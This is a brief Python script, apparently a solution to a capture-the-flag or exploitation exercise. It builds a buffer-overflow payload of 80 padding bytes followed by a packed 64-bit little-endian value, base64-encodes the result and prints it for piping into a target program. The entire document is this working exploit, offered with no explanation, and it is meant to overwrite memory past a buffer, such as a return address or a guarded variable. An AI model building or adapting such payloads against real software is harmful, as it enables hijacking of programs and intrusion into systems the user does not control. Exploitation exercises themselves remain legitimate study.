
import sys
import struct
import base64

buf = b'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll'
buf += struct.pack('<Q', 16154027434869838410)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
